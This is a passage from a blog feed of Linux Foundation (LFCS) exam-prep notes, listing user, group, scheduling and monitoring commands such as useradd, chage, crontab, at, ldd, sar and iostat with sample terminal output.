

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getent networks
</span><span class='line'>default               0.0.0.0
</span><span class='line'>loopback              127.0.0.0
</span><span class='line'>link-local            169.254.0.0</span></code></pre></td></tr></table></div></figure>


<h4>set</h4>

<blockquote><p>list shell attributes</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>set -o
</span><span class='line'>allexport         off
</span><span class='line'>braceexpand       on
</span><span class='line'>emacs             on
</span><span class='line'>errexit           off
</span><span class='line'>errtrace          off
</span><span class='line'>functrace         off
</span><span class='line'>hashall           on
</span><span class='line'>histexpand        on
</span><span class='line'>history           on
</span><span class='line'>ignoreeof         off
</span><span class='line'>interactive-comments  on
</span><span class='line'>keyword           off
</span><span class='line'>monitor           on
</span><span class='line'>noclobber         off
</span><span class='line'>noexec            off
</span><span class='line'>noglob            off
</span><span class='line'>nolog             off
</span><span class='line'>notify            off
</span><span class='line'>nounset           off
</span><span class='line'>onecmd            off
</span><span class='line'>physical          off
</span><span class='line'>pipefail          off
</span><span class='line'>posix             off
</span><span class='line'>privileged        off
</span><span class='line'>verbose           off
</span><span class='line'>vi                off
</span><span class='line'>xtrace            off</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>-o <option name> set option to on</p></li>
<li><p>+o <option name> set option to off</p></li>
</ul>


<p>Example: noclobber protects files from being accidentally overwritten with >. To set it at login, add it in .bashrc. You can still overwrite with: <strong>>|</strong></p>

<h4>who</h4>

<blockquote><p>show who is logged on</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>who
</span><span class='line'>root     :0           2017-09-19 12:38 (:0)
</span><span class='line'>root     pts/0        2017-09-19 12:38 (:0)
</span><span class='line'>root     pts/1        2017-09-19 12:40 (:0)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>b # time of last system boot</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>who -b
</span><span class='line'>         system boot  2017-09-19 12:36</span></code></pre></td></tr></table></div></figure>


<ul>
<li>q # all login names and number of users logged on</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>who -q
</span><span class='line'>root root root
</span><span class='line'># users=3</span></code></pre></td></tr></table></div></figure>


<ul>
<li>r # print current runlevel</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>who -r
</span><span class='line'>         run-level 5  2017-09-20 13:15</span></code></pre></td></tr></table></div></figure>


<h4>id</h4>

<blockquote><p>print real and effective user and group IDs</p></blockquote>

<ul>
<li>print all group IDs</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>id -G madhat
</span><span class='line'>1000 10</span></code></pre></td></tr></table></div></figure>


<ul>
<li>print group names</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>id -Gn madhat
</span><span class='line'>madhat wheel</span></code></pre></td></tr></table></div></figure>


<h4>useradd</h4>

<blockquote><p>create a new user or update default new user information</p></blockquote>

<ul>
<li>-c # Any text string. It is generally a short description of the login, and is currently used as the field for the user&rsquo;s full name.</li>
<li>-e # expire date. The date on which the user account will be disabled. The date is specified in the format YYYY-MM-DD.</li>
</ul>


<p>If not specified, useradd will use the default expiry date specified by the EXPIRE variable in /etc/default/useradd, or an empty string (no expiry) by default.</p>

<ul>
<li>-g # The group name or number of the user&rsquo;s initial login group. The group name must exist. A group number must refer to an already existing group.</li>
<li>-G # A list of supplementary groups which the user is also a member of. Each group is separated from the next by a comma, with no intervening whitespace</li>
<li>-m # Create the user&rsquo;s home directory if it does not exist</li>
<li><p>-s # The name of the user&rsquo;s login shell</p></li>
<li><p>create user, specify primary and supplementary groups, create home directory, specify login shell</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>useradd -c 'sample user' -g samplegroup -G users -m -s /bin/sh nixer
</span><span class='line'>grep nixer /etc/passwd
</span><span class='line'>nixer:x:1001:1025:sample user:/home/nixer:/bin/sh</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list defaults</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>useradd -D
</span><span class='line'>GROUP=100
</span><span class='line'>HOME=/home
</span><span class='line'>INACTIVE=-1
</span><span class='line'>EXPIRE=
</span><span class='line'>SHELL=/bin/bash
</span><span class='line'>SKEL=/etc/skel
</span><span class='line'>CREATE_MAIL_SPOOL=yes</span></code></pre></td></tr></table></div></figure>


<h4>adduser</h4>

<ul>
<li>symlink to useradd on CentOS, Perl script on Debian / Ubuntu</li>
</ul>


<h4>usermod</h4>

<blockquote><p>modify a user account</p></blockquote>

<ul>
<li>-c # new comment</li>
<li>-d # new home directory</li>
<li>-l # new login name</li>
<li>-s # new shell</li>
</ul>


<h4>chsh</h4>

<blockquote><p>change your login shell</p></blockquote>

<ul>
<li><p>-s # new shell</p></li>
<li><p>list shells</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chsh -l
</span><span class='line'>/bin/sh
</span><span class='line'>/bin/bash
</span><span class='line'>/sbin/nologin
</span><span class='line'>/usr/bin/sh
</span><span class='line'>/usr/bin/bash
</span><span class='line'>/usr/sbin/nologin
</span><span class='line'>/bin/tcsh
</span><span class='line'>/bin/csh</span></code></pre></td></tr></table></div></figure>


<h4>userdel</h4>

<blockquote><p>delete a user account and related files</p></blockquote>

<h4>chpasswd</h4>

<blockquote><p>update passwords in batch mode</p>

<p>The chpasswd command reads a list of user name and password pairs from
standard input and uses this information to update a group of existing
users. Each line is of the format:</p>

<p>user_name:password</p>

<p>This command is intended to be used in a large system environment where
many accounts are created at a single time.</p></blockquote>

<h4>chage</h4>

<blockquote><p>change user password expiry information</p></blockquote>

<ul>
<li>set password expiration date and list account aging information</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chage -E 2017-11-20 madhat
</span><span class='line'>[root@tron ~]# chage -l madhat
</span><span class='line'>Last password change                  : never
</span><span class='line'>Password expires                  : never
</span><span class='line'>Password inactive                 : never
</span><span class='line'>Account expires                       : Nov 20, 2017
</span><span class='line'>Minimum number of days between password change        : 0
</span><span class='line'>Maximum number of days between password change        : 99999
</span><span class='line'>Number of days of warning before password expires : 7</span></code></pre></td></tr></table></div></figure>


<h4>pwconv</h4>

<blockquote><p>creates shadow from passwd and an optionally existing shadow.</p></blockquote>

<h4>pwunconv</h4>

<blockquote><p>creates passwd from passwd and shadow and then removes shadow.</p></blockquote>

<h4>grpconv</h4>

<blockquote><p>creates gshadow from group and an optionally existing gshadow.</p></blockquote>

<h4>grpunconv</h4>

<blockquote><p>creates group from group and gshadow and then removes gshadow.</p></blockquote>

<h4>newgrp</h4>

<blockquote><p>log in to a new group &ndash; change the current group ID during a login session</p></blockquote>

<h4>groupadd</h4>

<blockquote><p>create a new group</p></blockquote>

<ul>
<li>-g # GID value</li>
</ul>


<h4>gpasswd</h4>

<blockquote><p>administer /etc/group and /etc/gshadow</p></blockquote>

<ul>
<li>-a # add user to group</li>
<li>-d # delete user from group</li>
<li>-M # set list of group members</li>
</ul>


<h4>chgrp</h4>

<blockquote><p>change group ownership</p>

<p>chgrp [OPTION]&hellip; GROUP FILE</p></blockquote>

<ul>
<li>-R # operate on files and directories recursively</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ You get along very well with everyone \
</span><span class='line'>\ except animals and people.            /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Operation of running systems]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/27/lfcs-prep-operation-of-running-systems/"/>
    <updated>2018-02-27T12:54:56-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/27/lfcs-prep-operation-of-running-systems</id>
    <content type="html"><![CDATA[<p>Various commands for the LFCS Operation of Running Systems domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/os1.png" title="linux cmds" alt="linux operation"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/os2.png" title="linux cmds" alt="linux operation"></p>

<ul>
<li>systemd-analyze</li>
</ul>


<blockquote><p>Analyze system boot-up performance</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemd-analyze
</span><span class='line'>Startup finished in 403ms (kernel) + 1.517s (initrd) + 37.584s (userspace) = 39.505s</span></code></pre></td></tr></table></div></figure>


<h4>crontab</h4>

<blockquote><p> maintains crontab files for individual users</p>

<p>Crontab  is the program used to install, remove or list the tables used to serve the
cron(8) daemon.  Each user can have their own crontab, and though  these  are  files
in  /var/spool/, they are not intended to be edited directly</p></blockquote>

<ul>
<li>format of crontab entry</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crontab
</span><span class='line'>SHELL=/bin/bash
</span><span class='line'>PATH=/sbin:/bin:/usr/sbin:/usr/bin
</span><span class='line'>MAILTO=root
</span><span class='line'>
</span><span class='line'># For details see man 4 crontabs
</span><span class='line'>
</span><span class='line'># Example of job definition:
</span><span class='line'># .---------------- minute (0 - 59)
</span><span class='line'># |  .------------- hour (0 - 23)
</span><span class='line'># |  |  .---------- day of month (1 - 31)
</span><span class='line'># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
</span><span class='line'># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
</span><span class='line'># |  |  |  |  |
</span><span class='line'># *  *  *  *  * user-name  command to be executed</span></code></pre></td></tr></table></div></figure>


<ul>
<li>run uptime as root every minute, hour, day of month, month, on weekdays</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crontab -e
</span><span class='line'>* * * * 1-5 uptime &gt;&gt; /root/log.txt</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You have new mail in /var/spool/mail/root
</span><span class='line'>[root@tron ~]# mail
</span><span class='line'>Heirloom Mail version 12.5 7/5/10.  Type ? for help.
</span><span class='line'>"/var/spool/mail/root": 4 messages 4 new
</span><span class='line'>&gt;N  1 (Cron Daemon)         Mon Oct  9 14:10  25/850   "Cron &lt;root@tron&gt; root"
</span><span class='line'> N  2 (Cron Daemon)         Mon Oct  9 14:11  25/850   "Cron &lt;root@tron&gt; root"
</span><span class='line'> N  3 (Cron Daemon)         Mon Oct  9 14:12  25/850   "Cron &lt;root@tron&gt; root"
</span><span class='line'> N  4 (Cron Daemon)         Mon Oct  9 14:13  25/850   "Cron &lt;root@tron&gt; root"</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> cat log.txt
</span><span class='line'> 14:29:02 up  1:03,  3 users,  load average: 0.01, 0.09, 0.12
</span><span class='line'> 14:30:01 up  1:04,  3 users,  load average: 0.39, 0.24, 0.18</span></code></pre></td></tr></table></div></figure>


<h4>anacron</h4>

<blockquote><p>runs commands periodically</p>

<p>Unlike cron(8), it does not assume that the machine is  running  continuously. <br/>
Hence, it can be used on machines that are not running 24 hours a day to control
regular jobs  as  daily,  weekly, and monthly jobs</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> cat /etc/anacrontab
</span><span class='line'> # /etc/anacrontab: configuration file for anacron
</span><span class='line'> 
</span><span class='line'> # See anacron(8) and anacrontab(5) for details.
</span><span class='line'> 
</span><span class='line'> SHELL=/bin/sh
</span><span class='line'> PATH=/sbin:/bin:/usr/sbin:/usr/bin
</span><span class='line'> MAILTO=root
</span><span class='line'> # the maximal random delay added to the base delay of the jobs
</span><span class='line'> RANDOM_DELAY=45
</span><span class='line'> # the jobs will be started during the following hours only
</span><span class='line'> START_HOURS_RANGE=3-22
</span><span class='line'> 
</span><span class='line'> #period in days   delay in minutes   job-identifier   command
</span><span class='line'> 1    5   cron.daily      nice run-parts /etc/cron.daily
</span><span class='line'> 7    25  cron.weekly     nice run-parts /etc/cron.weekly
</span><span class='line'> @monthly 45  cron.monthly        nice run-parts /etc/cron.monthly</span></code></pre></td></tr></table></div></figure>


<ul>
<li>anacron job</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1 1 demo netstat -lnt &gt; /root/conn.txt</span></code></pre></td></tr></table></div></figure>


<p>Check validity of job file with <code>anacron -T</code></p>

<h4>at</h4>

<blockquote><p>executes commands at a specified time</p></blockquote>

<ul>
<li>schedule job and use Ctrl-D at the prompt when you&rsquo;re done</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> at 19:08 oct 09
</span><span class='line'> at&gt; netstat -lnt &gt; /root/ports.txt
</span><span class='line'> at&gt; &lt;EOT&gt;
</span><span class='line'> job 3 at Mon Oct  9 19:08:00 2017</span></code></pre></td></tr></table></div></figure>


<h4>atq</h4>

<blockquote><p>lists  the  user&rsquo;s  pending  jobs, unless the user is the superuser; in that case,
everybody&rsquo;s jobs are listed.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> [root@tron ~]# atq
</span><span class='line'> 3    Mon Oct  9 19:08:00 2017 a root</span></code></pre></td></tr></table></div></figure>


<h4>ldd</h4>

<blockquote><p>print shared library dependencies</p>

<p>In the usual  case,  ldd  invokes  the  standard  dynamic  linker  (see ld.so(8))<br/>
with the LD_TRACE_LOADED_OBJECTS environment variable set to 1, which causes the
linker to display  the  library  dependencies.   Be aware,  > however,  that  in some
circumstances, some versions of ldd may attempt to obtain the dependency information
by directly executing  the program.  Thus, you should never employ ldd on an untrusted
executable, since this may result in the execution  of  arbitrary  code.   A  safer
alternative when dealing with untrusted executables is:</p>

<p>$ objdump -p /path/to/program | grep NEEDED</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ldd /usr/bin/bash
</span><span class='line'>  linux-vdso.so.1 =&gt;  (0x00007fff62b20000)
</span><span class='line'>  libtinfo.so.5 =&gt; /lib64/libtinfo.so.5 (0x00007ff06afba000)
</span><span class='line'>  libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007ff06adb6000)
</span><span class='line'>  libc.so.6 =&gt; /lib64/libc.so.6 (0x00007ff06a9f4000)
</span><span class='line'>  /lib64/ld-linux-x86-64.so.2 (0x00007ff06b1f9000)</span></code></pre></td></tr></table></div></figure>


<h4>sar</h4>

<blockquote><p>Collect, report, or save system activity information</p></blockquote>

<ul>
<li>CPU activity</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sar
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 03:57:29 PM       LINUX RESTART
</span><span class='line'> 
</span><span class='line'> 04:00:01 PM     CPU     %user     %nice   %system   %iowait    %steal     %idle
</span><span class='line'> 04:10:01 PM     all      2.66      0.00      1.02      0.15      0.00     96.17
</span><span class='line'> 04:20:01 PM     all      2.64      0.00      0.83      0.01      0.00     96.52
</span><span class='line'> 04:30:01 PM     all      0.65      0.03      0.94      0.09      0.00     98.28
</span><span class='line'> 04:40:01 PM     all      0.35      0.00      0.20      0.00      0.00     99.45
</span><span class='line'> 04:50:01 PM     all      0.25      0.00      0.14      0.00      0.00     99.60
</span><span class='line'> 05:00:01 PM     all      0.24      0.00      0.17      0.00      0.00     99.58
</span><span class='line'> 05:10:01 PM     all      0.24      0.00      0.17      0.00      0.00     99.59
</span><span class='line'> 05:20:01 PM     all      0.35      0.00      0.20      0.00      0.00     99.45
</span><span class='line'> 05:30:01 PM     all      0.40      0.00      0.24      0.00      0.00     99.36
</span><span class='line'> 05:40:01 PM     all      0.51      0.00      0.21      0.00      0.00     99.27
</span><span class='line'> 05:50:01 PM     all      5.88      0.00      1.51      0.02      0.00     92.59
</span><span class='line'> 06:00:02 PM     all      0.48      0.00      0.25      0.00      0.00     99.27
</span><span class='line'> 06:10:01 PM     all      0.16      0.00      0.19      0.00      0.00     99.65
</span><span class='line'> 06:20:01 PM     all      2.16      0.00      0.59      0.01      0.00     97.25
</span><span class='line'> 06:30:01 PM     all      2.94      0.00      0.69      0.00      0.00     96.37
</span><span class='line'> 06:40:01 PM     all      0.10      0.00      0.18      0.00      0.00     99.72
</span><span class='line'> 06:50:01 PM     all      0.11      0.00      0.13      0.00      0.00     99.76
</span><span class='line'> 07:00:02 PM     all      0.17      0.00      0.21      0.00      0.00     99.62
</span><span class='line'> 07:10:01 PM     all      0.10      0.00      0.15      0.00      0.00     99.76
</span><span class='line'> 07:20:01 PM     all      0.10      0.00      0.14      0.00      0.00     99.76
</span><span class='line'> 07:30:01 PM     all      0.14      0.00      0.16      0.00      0.00     99.70
</span><span class='line'> 07:40:02 PM     all      0.10      0.00      0.14      0.00      0.00     99.76
</span><span class='line'> 
</span><span class='line'> 07:40:02 PM     CPU     %user     %nice   %system   %iowait    %steal     %idle
</span><span class='line'> 07:50:01 PM     all      0.09      0.00      0.15      0.00      0.00     99.75
</span><span class='line'> 08:00:01 PM     all      0.19      0.00      0.26      0.00      0.00     99.55
</span><span class='line'> 08:10:01 PM     all      0.44      0.00      0.22      0.00      0.00     99.34
</span><span class='line'> Average:        all      0.84      0.00      0.36      0.01      0.00     98.78</span></code></pre></td></tr></table></div></figure>


<ul>
<li>memory statistics</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sar -r
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 03:57:29 PM       LINUX RESTART
</span><span class='line'> 
</span><span class='line'> 04:00:01 PM kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty
</span><span class='line'> 04:10:01 PM    889804    994304     52.77      1004    382376   2556680     64.22    522128    294044        12
</span><span class='line'> 04:20:01 PM    890844    993264     52.72      1004    382456   2556872     64.22    521256    294004         4
</span><span class='line'> 04:30:01 PM    802736   1081372     57.39      1004    387280   2557724     64.24    524088    296556         0
</span><span class='line'> 04:40:01 PM    802744   1081364     57.39      1004    387320   2557724     64.24    524120    296564        12
</span><span class='line'> 04:50:01 PM    802712   1081396     57.40      1004    387296   2557724     64.24    524096    296556         0
</span><span class='line'> 05:00:01 PM    802640   1081468     57.40      1004    387304   2582312     64.86    524252    296544         8
</span><span class='line'> 05:10:01 PM    803032   1081076     57.38      1004    387288   2581776     64.85    524048    296516         0
</span><span class='line'> 05:20:01 PM    798948   1085160     57.60      1004    387288   2581776     64.85    528108    296516         0
</span><span class='line'> 05:30:01 PM    798808   1085300     57.60      1004    387312   2581776     64.85    528156    296524        20
</span><span class='line'> 05:40:01 PM    798552   1085556     57.62      1004    387344   2581720     64.85    528424    296520         0
</span><span class='line'> 05:50:01 PM    773308   1110800     58.96      1004    388048   2605656     65.45    553040    297056         0
</span><span class='line'> 06:00:02 PM    773116   1110992     58.97      1004    388056   2605656     65.45    553196    297056         0
</span><span class='line'> 06:10:01 PM    770812   1113296     59.09      1004    388564   2605664     65.45    554944    297556         0
</span><span class='line'> 06:20:01 PM    733504   1150604     61.07      1004    388708   2642264     66.37    592036    297640         0
</span><span class='line'> 06:30:01 PM    732720   1151388     61.11      1004    388852   2642544     66.37    592928    297552         0
</span><span class='line'> 06:40:01 PM    732732   1151376     61.11      1004    388884   2642608     66.38    592956    297556         8
</span><span class='line'> 06:50:01 PM    732640   1151468     61.11      1004    388864   2642608     66.38    592948    297556         0
</span><span class='line'> 07:00:02 PM    732616   1151492     61.12      1004    388872   2642608     66.38    593060    297496         0
</span><span class='line'> 07:10:01 PM    732512   1151596     61.12      1004    388880   2642608     66.38    593120    297496         0
</span><span class='line'> 07:20:01 PM    732536   1151572     61.12      1004    388888   2642608     66.38    593324    297320         0
</span><span class='line'> 07:30:01 PM    732452   1151656     61.12      1004    388896   2642608     66.38    593348    297320         0
</span><span class='line'> 07:40:02 PM    732424   1151684     61.13      1004    388924   2642608     66.38    593364    297324         4
</span><span class='line'> 
</span><span class='line'> 07:40:02 PM kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty
</span><span class='line'> 07:50:01 PM    732388   1151720     61.13      1004    388908   2642608     66.38    593376    297320         0
</span><span class='line'> 08:00:01 PM    732444   1151664     61.13      1004    388956   2642608     66.38    594632    296136         8
</span><span class='line'> 08:10:01 PM    752844   1131264     60.04      1004    388988   2621972     65.86    574028    296148         0
</span><span class='line'> Average:       772795   1111313     58.98      1004    387782   2608132     65.51    560359    296755         3</span></code></pre></td></tr></table></div></figure>


<h4>iostat</h4>

<blockquote><p>report CPU statistics and input/output statistics for devices and partitions.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> iostat
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> avg-cpu:  %user   %nice %system %iowait  %steal   %idle
</span><span class='line'>            1.41    0.01    0.76    0.20    0.00   97.61
</span><span class='line'> 
</span><span class='line'> Device:            tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn
</span><span class='line'> sda               2.09        54.42         6.10     452565      50723
</span><span class='line'> dm-0              1.85        50.73         5.85     421879      48655
